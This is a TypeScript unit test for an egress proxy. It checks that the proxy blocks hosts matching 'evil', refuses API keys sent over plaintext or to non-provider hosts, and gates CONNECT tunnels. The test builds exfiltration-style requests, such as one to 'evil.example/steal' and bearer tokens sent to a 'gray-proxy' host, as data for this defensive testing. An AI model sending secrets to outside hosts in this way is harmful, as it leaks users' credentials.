// Unit test for the egress proxy (run: npx tsx scripts/proxy.test.ts).
// Uses the injected `decide` seam (no engine needed) + local HTTP/TCP echo targets.
import { createServer as httpServer, request as httpRequest } from 'node:http';
import { createServer as tcpServer, connect as tcpConnect } from 'node:net';
import { EgressProxy } from '../src/proxy/server.js';
import type { PipelineResult } from '../src/contract/types.js';

let pass = 0,
  fail = 0;
function check(name: string, cond: boolean, detail = ''): void {
  if (cond) (pass++, console.log(`  ✅ ${name}`));
  else (fail++, console.log(`  ❌ ${name} — ${detail}`));
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const PROXY = 9110;
const HTTP_TARGET = 9111;
const TCP_TARGET = 9112;

// decide: BLOCK anything whose host contains "evil", else ALLOW.
const decide = (url: string): Promise<PipelineResult> => {
  let host = '';
  try {
    host = new URL(url).hostname;
  } catch {
    host = url;
  }
  return Promise.resolve(host.includes('evil') ? { action: 'BLOCK', reason: 'blocked destination' } : { action: 'ALLOW', reason: 'ok' });
};

// local HTTP echo target
const httpTarget = httpServer((req, res) => {
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end(`echo ${req.method} ${req.url}`);
});
// local TCP echo target (for CONNECT tunnel)
const tcpTarget = tcpServer((s) => s.pipe(s));

/** Send an absolute-URI request THROUGH the proxy (plain-HTTP forward), with optional extra headers. */
function proxied(targetUrl: string, extra: Record<string, string> = {}): Promise<{ status: number; body: string }> {
  return new Promise((resolve) => {
    const u = new URL(targetUrl);
    const req = httpRequest({ host: '127.0.0.1', port: PROXY, method: 'GET', path: targetUrl, headers: { host: u.host, ...extra } }, (res) => {
      let d = '';
      res.on('data', (c) => (d += c));
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body: d }));
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e) }));
    req.end();
  });
}

/** Raw CONNECT to the proxy; resolve with the status line and (for ALLOW) the tunnel echo. */
function rawConnect(hostport: string): Promise<{ established: boolean; status: number; echo?: string }> {
  return new Promise((resolve) => {
    const s = tcpConnect(PROXY, '127.0.0.1', () => s.write(`CONNECT ${hostport} HTTP/1.1\r\nHost: ${hostport}\r\n\r\n`));
    let phase: 'head' | 'tunnel' = 'head';
    let buf = '';
    let settled = false;
    const done = (v: { established: boolean; status: number; echo?: string }) => { if (!settled) { settled = true; resolve(v); s.destroy(); } };
    s.on('data', (chunk) => {
      if (phase === 'head') {
        buf += chunk.toString();
        const m = /^HTTP\/1\.1 (\d{3})/.exec(buf);
        if (m && m[1] !== '200') return done({ established: false, status: Number(m[1]) });
        if (buf.includes('200 Connection Established') && buf.includes('\r\n\r\n')) {
          phase = 'tunnel';
          s.write('ping'); // through the tunnel to the TCP echo target
        }
      } else {
        done({ established: true, status: 200, echo: chunk.toString() });
      }
    });
    s.on('error', () => done({ established: false, status: 0 }));
    setTimeout(() => done({ established: false, status: -1 }), 3000);
  });
}

async function main() {
  await new Promise<void>((r) => httpTarget.listen(HTTP_TARGET, '127.0.0.1', r));
  await new Promise<void>((r) => tcpTarget.listen(TCP_TARGET, '127.0.0.1', r));
  const proxy = new EgressProxy({ port: PROXY, engineHost: '127.0.0.1', enginePort: 0, failOpen: false, decide });
  await proxy.listen();
  await sleep(50);

  // ── plain HTTP forward ──
  const allowed = await proxied(`http://127.0.0.1:${HTTP_TARGET}/ok`);
  check('HTTP forward (allowed) → 200 + forwarded body', allowed.status === 200 && allowed.body.includes('echo GET'), JSON.stringify(allowed));
  const blocked = await proxied('http://evil.example/steal');
  check('HTTP forward (blocked host) → 403', blocked.status === 403 && /BLOCK/.test(blocked.body), JSON.stringify(blocked));

  // ── credential guard (Layer 3): API key must not leave over plaintext / to a non-provider ──
  const keyPlaintext = await proxied(`http://127.0.0.1:${HTTP_TARGET}/`, { authorization: 'Bearer sk-ant-abcdef123456' });
  check('API key over plaintext HTTP → 403', keyPlaintext.status === 403 && /plaintext/i.test(keyPlaintext.body), JSON.stringify(keyPlaintext));
  const keyToNonProvider = await proxied('http://gray-proxy.example/v1/messages', { authorization: 'Bearer sk-ant-abcdef123456' });
  check('API key to non-provider host → 403', keyToNonProvider.status === 403 && /non-provider|plaintext/i.test(keyToNonProvider.body), JSON.stringify(keyToNonProvider));
  const keyInCookie = await proxied(`http://127.0.0.1:${HTTP_TARGET}/`, { cookie: 'sess=AKIAIOSFODNN7EXAMPLE' });
  check('structured secret in a non-standard header (cookie) → 403 (M-3)', keyInCookie.status === 403, JSON.stringify(keyInCookie));
  const noKey = await proxied(`http://127.0.0.1:${HTTP_TARGET}/plain`); // no credential → normal engine gate (allowed here)
  check('no-credential request still forwarded', noKey.status === 200, JSON.stringify(noKey));

  // ── HTTPS CONNECT gating ──
  const connBlocked = await rawConnect('evil.example:443');
  check('CONNECT to blocked host → 403 (not established)', !connBlocked.established && connBlocked.status === 403, JSON.stringify(connBlocked));
  const connOk = await rawConnect(`127.0.0.1:${TCP_TARGET}`);
  check('CONNECT to allowed host → tunnel established + echoes', connOk.established && connOk.echo === 'ping', JSON.stringify(connOk));

  await proxy.close();
  httpTarget.close();
  tcpTarget.close();
  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
}
void main();
